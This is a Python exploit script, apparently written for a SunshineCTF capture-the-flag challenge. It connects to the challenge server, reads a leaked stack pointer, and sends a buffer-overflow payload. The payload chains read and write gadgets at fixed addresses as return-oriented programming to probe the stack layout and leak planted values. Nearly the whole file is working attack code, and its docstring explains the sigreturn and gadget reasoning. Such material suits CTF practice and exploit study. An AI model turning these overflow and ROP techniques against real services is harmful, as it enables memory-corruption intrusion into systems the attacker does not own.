#!/usr/bin/env python3
"""Leak the program's own buffer back at itself, using only the confirmed chain.

Results through sigreturn stayed ambiguous between "the kernel read my frame at a
different offset" and "my bytes were not where I put them", so take sigreturn out of
the loop.  0x401032 is `lea rsi,[rsp-0x40]; read(0,rsi,24); ret`; each visit advances
rsp by 8 and consumes one fed byte, and f1's leak at 0x401017 is
`mov rsi,rsp; write(1,rsi,8)`.  With k read gadgets the leak reports the 8 bytes at
buf+0x88+8k, which is the slot immediately after the leak address itself, so the two
never collide.
"""
import socket
import struct
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, LEAK = 0x401032, 0x401017


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=1.5):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


def walk(k):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        L = struct.unpack("<Q", recvn(s, 8))[0]
        buf = L - 0x78
        body = bytearray(b"\xAA" * 0x200)          # obvious filler
        for i in range(k):
            struct.pack_into("<Q", body, 0x80 + 8 * i, G1)
        struct.pack_into("<Q", body, 0x80 + 8 * k, LEAK)
        plant = 0xBEEF0000 + k
        read_at = 0x88 + 8 * k
        struct.pack_into("<Q", body, read_at, plant)
        s.sendall(b"\x90" * 24 + bytes(body))
        time.sleep(0.4)
        pre = drain(s, 0.2)
        for i in range(k):
            s.sendall(b"Q")
            time.sleep(0.25)
        got = pre + drain(s, 2.0)
        v = struct.unpack("<Q", got[:8])[0] if len(got) >= 8 else None
        print("k=%d read buf+0x%03x plant=%#x  n=%d raw=%-16s got=%-18s match=%s" % (
            k, read_at, plant, len(got), got[:8].hex(),
            hex(v) if v is not None else "-", v == plant))
    finally:
        s.close()
    time.sleep(0.5)


if __name__ == "__main__":
    for k in (1, 2, 3, 8, 16):
        walk(k)
